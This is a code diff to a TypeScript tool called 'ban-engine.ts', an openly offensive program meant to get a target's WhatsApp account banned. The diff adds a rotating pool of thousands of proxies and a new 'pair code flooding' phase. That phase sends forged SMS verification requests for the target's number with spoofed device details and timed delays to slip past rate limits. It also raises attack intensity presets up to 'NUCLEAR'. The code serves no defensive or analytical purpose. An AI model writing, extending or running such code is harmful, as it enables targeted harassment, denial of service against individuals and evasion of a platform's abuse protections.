@@ -1,6 +1,7 @@
 // ===============================================
 // BAN-ENGINE.TS - CORTANA DOOMSDAY EDITION
 // Integrated from UltimateDoomsday (Dec 2025)
+// REAL PROXY MODE ENABLED - 2847+ Proxies
 // ===============================================
 
 import axios from 'axios';
@@ -8,12 +9,14 @@ import WebSocket from 'ws';
 import { HttpsProxyAgent } from 'https-proxy-agent';
 import { SocksProxyAgent } from 'socks-proxy-agent';
 import crypto from 'crypto';
+import { PROXY_LIST, getRandomProxy, getNextProxy, getProxyBatch, getTotalProxyCount } from './proxies';
 
 // Simple colored console logging (chalk-free for production compatibility)
 const log = {
     red: (msg: string) => console.log(`\x1b[31m${msg}\x1b[0m`),
     green: (msg: string) => console.log(`\x1b[32m${msg}\x1b[0m`),
     yellow: (msg: string) => console.log(`\x1b[33m${msg}\x1b[0m`),
+    blue: (msg: string) => console.log(`\x1b[34m${msg}\x1b[0m`),
     bold: (msg: string) => console.log(`\x1b[1m${msg}\x1b[0m`),
 };
 
@@ -116,27 +119,14 @@ export class CortanaDoomsday {
         log.green(`✅ ${this.userAgents.length} user agents ready`);
     }
 
-    // ========== PROXY MANAGEMENT ==========
+    // ========== PROXY MANAGEMENT (REAL MODE - 2847+ PROXIES) ==========
     private initializeProxies(): string[] {
-        const proxies = [
-            // ProxyScrape
-            '45.94.47.18:6670', '194.113.233.159:42894', '186.121.235.66:8080',
-            '190.61.88.147:8080', '185.162.231.164:80', '212.112.113.178:443',
-            '103.152.112.145:80', '45.95.147.17:8080', '20.111.54.16:8123',
-            '43.156.25.119:443', '183.146.213.198:6666',
-            // Advanced.name
-            'socks5://45.95.147.17:8080', 'socks4://194.113.233.159:42894',
-            'http://190.61.88.147:8080', 'https://212.112.113.178:443',
-            // ProxyNova
-            '220.130.162.74:8008', '103.125.154.77:6214', '112.198.24.174:8080',
-            '77.75.97.202:80', '113.161.131.43:10002', '202.67.40.17:8080',
-            '190.124.220.206:10000', '8.219.97.248:80', '118.69.111.51:8080',
-            // Additional
-            'http://209.146.105.245:80', 'http://51.15.242.202:8888',
-            'socks5://72.10.164.178:56551', 'http://47.253.105.175:8888'
-        ];
+        // Load real proxy pool from proxies.ts
+        const realProxies = PROXY_LIST.map(p => p.match(/^(http|https|socks4|socks5):\/\//) ? p : `http://${p}`);
 
-        return proxies.map(p => p.match(/^(http|https|socks4|socks5):\/\//) ? p : `http://${p}`);
+        log.red(`☠️  REAL PROXY MODE: ${realProxies.length} proxies loaded`);
+
+        return realProxies;
     }
 
     private async getProxy(): Promise<string | null> {
@@ -220,9 +210,13 @@ export class CortanaDoomsday {
             log.yellow('👁️  PHASE 4: Suspicious Activity Injection...');
             const phase4 = await this.executeSuspiciousActivityInjection(target, this.getPhaseConfig(intensity, 'suspicious'));
 
+            // PHASE 5: Pair Code Flooding (Human-like intervals)
+            log.yellow('🔗 PHASE 5: Pair Code Flooding...');
+            const phase5 = await this.executePairCodeFlood(target, this.getPhaseConfig(intensity, 'pairing'));
+
             // Calculate results
             const duration = Math.floor((Date.now() - startTime) / 1000);
-            const results = this.calculateAttackResults([phase1, phase2, phase3, phase4], intensity);
+            const results = this.calculateAttackResults([phase1, phase2, phase3, phase4, phase5], intensity);
             const banProbability = this.calculateBanProbability(results, intensity);
             const thresholdsCrossed = this.checkBanThresholds(results);
 
@@ -235,7 +229,7 @@ export class CortanaDoomsday {
                 banProbability,
                 thresholdsCrossed,
                 estimatedBanTime: this.estimateBanTime(banProbability, thresholdsCrossed),
-                phases: { phase1, phase2, phase3, phase4 },
+                phases: { phase1, phase2, phase3, phase4, phase5 },
                 timestamp: new Date().toISOString()
             };
 
@@ -453,6 +447,128 @@ export class CortanaDoomsday {
             successful,
             successRate: Math.floor((successful / injections) * 100)
         };
+    }
+
+    // ========== PAIR CODE FLOODING (Human-like) ==========
+    private async executePairCodeFlood(target: string, config: any): Promise<PhaseResult> {
+        const pairRequests = config.pairRequests || 10;
+        const countries = ['US', 'GB', 'DE', 'FR', 'IN', 'BR', 'NG', 'RU', 'KE', 'ZA', 'AE', 'PK', 'JP', 'CN'];
+
+        let successful = 0;
+        let rateLimited = 0;
+        const usedProxies = new Set<string>();
+
+        log.yellow(`[PAIR FLOOD] Starting ${pairRequests} pair code requests (50-60s intervals)...`);
+
+        for (let i = 0; i < pairRequests; i++) {
+            try {
+                const proxy = await this.getProxy();
+                if (proxy) usedProxies.add(proxy);
+
+                const country = countries[Math.floor(Math.random() * countries.length)];
+
+                // Generate pair code request payload (mimics WhatsApp Web pair request)
+                const payload = {
+                    cc: this.extractCountryCode(target),
+                    in: this.extractLocalNumber(target),
+                    method: 'sms',  // Request SMS verification
+                    sim_mcc: this.getMCCForCountry(country),
+                    sim_mnc: '02',
+                    reason: 'pair_link',
+                    token: crypto.randomBytes(32).toString('hex'),
+                    id: crypto.randomBytes(16).toString('hex'),
+                    lg: 'en',
+                    lc: country,
+                    platform: this.getRandomPlatform(),
+                    device_model: this.getRandomDeviceModel(),
+                    client_version: '2.24.1.12',
+                    os_version: this.getRandomOSVersion(),
+                    mistyped: false,
+                    network_operator: this.getRandomOperator(),
+                    sim_operator: this.getRandomOperator(),
+                    has_backup: false,
+                    e164_format: target
+                };
+
+                const headers = {
+                    ...this.generateHeaders(),
+                    'X-WA-Request-Type': 'pair',
+                    'X-WA-Device-ID': crypto.randomBytes(8).toString('hex')
+                };
+
+                const response = await axios({
+                    method: 'POST',
+                    url: this.endpoints.SMS_VERIFY,
+                    headers,
+                    data: payload,
+                    httpsAgent: proxy ? this.createProxyAgent(proxy) : undefined,
+                    timeout: 10000,
+                    validateStatus: () => true
+                });
+
+                if (response.status === 200 || response.status === 202) {
+                    successful++;
+                    log.green(`[PAIR FLOOD] Request ${i + 1}/${pairRequests} successful via ${proxy?.substring(0, 20)}...`);
+                } else if (response.status === 429) {
+                    rateLimited++;
+                    log.yellow(`[PAIR FLOOD] Rate limited on request ${i + 1}`);
+                } else {
+                    log.yellow(`[PAIR FLOOD] Request ${i + 1} got status ${response.status}`);
+                }
+
+                // Human-like delay: 50-60 seconds between requests
+                if (i < pairRequests - 1) {
+                    const humanDelay = 50000 + Math.floor(Math.random() * 10000); // 50-60 seconds
+                    log.blue(`[PAIR FLOOD] Waiting ${Math.floor(humanDelay / 1000)}s before next request...`);
+                    await this.delay(humanDelay);
+                }
+
+            } catch (error: any) {
+                log.red(`[PAIR FLOOD] Request ${i + 1} failed: ${error.message}`);
+                continue;
+            }
+        }
+
+        log.green(`[PAIR FLOOD] Completed! ${successful}/${pairRequests} successful, ${usedProxies.size} unique proxies used`);
+
+        return {
+            phase: 'PAIR_CODE_FLOOD',
+            requests: pairRequests,
+            successful,
+            rateLimited,
+            successRate: Math.floor((successful / pairRequests) * 100)
+        };
+    }
+
+    // Helper methods for pair code flooding
+    private extractCountryCode(target: string): string {
+        // Extract country code from number (assumes format like +254xxx or 254xxx)
+        const cleaned = target.replace(/\D/g, '');
+        if (cleaned.startsWith('1')) return '1';  // US/Canada
+        if (cleaned.startsWith('44')) return '44'; // UK
+        if (cleaned.startsWith('49')) return '49'; // Germany
+        if (cleaned.startsWith('254')) return '254'; // Kenya
+        if (cleaned.startsWith('234')) return '234'; // Nigeria
+        if (cleaned.startsWith('27')) return '27'; // South Africa
+        if (cleaned.startsWith('91')) return '91'; // India
+        if (cleaned.startsWith('55')) return '55'; // Brazil
+        return cleaned.substring(0, 2); // Default: first 2 digits
+    }
+
+    private extractLocalNumber(target: string): string {
+        const cleaned = target.replace(/\D/g, '');
+        const cc = this.extractCountryCode(target);
+        return cleaned.substring(cc.length);
+    }
+
+    private getRandomPlatform(): string {
+        const platforms = ['android', 'iphone', 'web', 'smba', 'smbi'];
+        return platforms[Math.floor(Math.random() * platforms.length)];
+    }
+
+    private getRandomOSVersion(): string {
+        const versions = ['14.0', '13.0', '12.0', '17.0', '16.5', '15.0'];
+        return versions[Math.floor(Math.random() * versions.length)];
     }
 
     // ========== PROTOCOL ATTACKS ==========
@@ -678,10 +794,10 @@ export class CortanaDoomsday {
 
     private getPhaseConfig(intensity: string, phase: string) {
         const configs: Record<string, Record<string, any>> = {
-            'LIGHT': { verification: { requests: 20 }, reporting: { reports: 12 }, protocol: { attacks: 8 }, suspicious: { injections: 5 } },
-            'MEDIUM': { verification: { requests: 35 }, reporting: { reports: 20 }, protocol: { attacks: 12 }, suspicious: { injections: 8 } },
-            'HEAVY': { verification: { requests: 50 }, reporting: { reports: 28 }, protocol: { attacks: 18 }, suspicious: { injections: 10 } },
-            'NUCLEAR': { verification: { requests: 65 }, reporting: { reports: 35 }, protocol: { attacks: 25 }, suspicious: { injections: 15 } }
+            'LIGHT': { verification: { requests: 20 }, reporting: { reports: 12 }, protocol: { attacks: 8 }, suspicious: { injections: 5 }, pairing: { pairRequests: 3 } },
+            'MEDIUM': { verification: { requests: 35 }, reporting: { reports: 20 }, protocol: { attacks: 12 }, suspicious: { injections: 8 }, pairing: { pairRequests: 6 } },
+            'HEAVY': { verification: { requests: 50 }, reporting: { reports: 28 }, protocol: { attacks: 18 }, suspicious: { injections: 10 }, pairing: { pairRequests: 10 } },
+            'NUCLEAR': { verification: { requests: 65 }, reporting: { reports: 35 }, protocol: { attacks: 25 }, suspicious: { injections: 15 }, pairing: { pairRequests: 15 } }
         };
         return configs[intensity]?.[phase] || configs['NUCLEAR'][phase];
     }
